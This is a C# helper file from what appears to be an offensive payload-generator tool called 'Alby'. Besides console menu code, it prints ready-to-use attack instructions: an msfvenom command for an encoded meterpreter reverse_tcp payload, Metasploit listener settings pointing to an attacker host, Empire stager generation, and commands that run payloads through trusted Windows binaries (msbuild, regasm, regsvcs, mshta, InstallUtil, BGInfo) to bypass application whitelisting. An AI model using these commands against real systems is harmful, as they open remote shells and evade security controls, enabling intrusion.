using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alby
{
    class Helpers
    {

        public static string FileFolderLocation(string DefaultFilename)
        {
            // Default Foldername - Where binary is executed
            string DefaultFoldername = AppDomain.CurrentDomain.BaseDirectory;

            // Filename
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("->Specify filename");
            Console.ResetColor();
            Console.WriteLine("Current filename is: " + DefaultFilename);
            Console.WriteLine("Press enter to keep it or type in wanted filename.");
            Console.Write("\nFilename: ");
            string Filename = Console.ReadLine();

            // Set to default
            if (String.IsNullOrEmpty(Filename))
            {
                Filename = DefaultFilename;
            }

            // Foldername
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("->Specify foldername");
            Console.ResetColor();
            // Add check if it ends with /
            Console.WriteLine("Current folder is: " + DefaultFoldername);
            Console.WriteLine("Press enter to keep current folder or type in wanted output folder.");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Important that path ends with \\!");
            Console.ResetColor();
            Console.Write("\nFoldername: ");
            string Foldername = Console.ReadLine();
            Console.WriteLine();

            // Set to default
            if (String.IsNullOrEmpty(Foldername))
            {
                Foldername = DefaultFoldername;
            }

            // Combine folder and file name
            string Result_FileAndFoldername = Foldername + Filename;

            Console.WriteLine("Payload " + Result_FileAndFoldername + " generated");
            Console.WriteLine();
            return Result_FileAndFoldername;
        }

        public static string PasteToString()
        {
            var line = "";
            string Output = String.Empty;

            line = Console.ReadLine();
            while (!string.IsNullOrEmpty(line))
            {
                Output += line;
                line = Console.ReadLine();
            }
            return Output;
        }

        public static string PauseExecution()
        {
            Console.WriteLine("Press any key to continue...");
            Console.ReadKey();
            return null;
        }

        public static string WriteMetasploitExample()
        {
            Console.WriteLine("Paste in your Metasploit C# payload here - Generate with MSFvenom like this:");
            Console.WriteLine("");
            Console.WriteLine("msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"192.168.10.10\" LPORT=\"443\" -e x86/shikata_ga_nai -i 15 -f csharp");
            Console.WriteLine("");
            Console.WriteLine("Metasploit commands to start listener:");
            Console.WriteLine("use exploit/multi/handler");
            Console.WriteLine("set payload windows/meterpreter/reverse_tcp");
            Console.WriteLine("set lhost 192.168.10.10");
            Console.WriteLine("set lport 443");
            Console.WriteLine();
            return null;
        }

        public static string WriteVBSMeterExample()
        {
            Console.WriteLine("Metasploit commands to start listener:");
            Console.WriteLine("use exploit/multi/handler");
            Console.WriteLine("set payload windows/meterpreter/reverse_tcp");
            Console.WriteLine("set lhost 192.168.10.10");
            Console.WriteLine("set lport 443");
            Console.WriteLine();
            return null;
        }

        public static string WriteMSBuildPayloadExample(string Outfile)
        {
            Console.WriteLine();
            Console.WriteLine("Commands used to execute payload:");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("C:\\Windows\\Microsoft.NET\\Framework\\V4.0.30319\\msbuild.exe " + Outfile);
            Console.ResetColor();
            return null;
        }

        public static string WriteRegsvcsRegasmPayloadExample(string Outfile)
        {
            Console.WriteLine();
            Console.WriteLine("Commands used to execute payload:");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U " + Outfile);
            Console.WriteLine("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe " + Outfile);
            Console.ResetColor();
            return null;
        }

        public static string WriteMSHTAPayloadExample(string Outfile)
        {
            Console.WriteLine();
            Console.WriteLine("Commands used to execute payload:");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("mshta " + Outfile);
            Console.WriteLine("Important that you include path to the payload or else mshta will have issues");
            Console.WriteLine("If having trouble with the mshta you could change extension to hta and run it directly.");
            Console.ResetColor();
            return null;
        }

        

        public static string WriteBGInfoPayloadExample(string Outfile)
        {
            Console.WriteLine();
            Console.WriteLine("Requires that BGInfo is allowed to execute! - Just sayin");
            Console.WriteLine("Commands used to execute payload:");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("C:\\BGInfo\\BGInfo.exe " + Outfile);
            Console.ResetColor();
            return null;
        }

        public static string WriteInstallUtilPayloadExample(string Outfile)
        {
            Console.WriteLine();
            Console.WriteLine("Commands used to execute payload:");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U " + Outfile);
            Console.ResetColor();
            return null;
        }

        public static string WriteEmpireExample()
        {
            Console.WriteLine("Paste in your Empire base64 encoded stager - Generate in Empire with these commands:");
            Console.WriteLine("");
            Console.WriteLine("usestager multi/launcher https");
            Console.WriteLine("generate");
            Console.WriteLine("");
            return null;
        }

        public static void AlbyAddToBanner(string TextToAdd)
        {
            string[] toPrint = { TextToAdd };
            Program.PrintBanner(toPrint);
        }


        public static int GenerateInputOptions(int ItemsInMenu)
        {
            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 0 || userInput > ItemsInMenu)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write(" Enter choice: ");
                    }
                    else
                    {
                        return userInput;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write(" Enter choice: ");
                }
            }
        }

    }
}
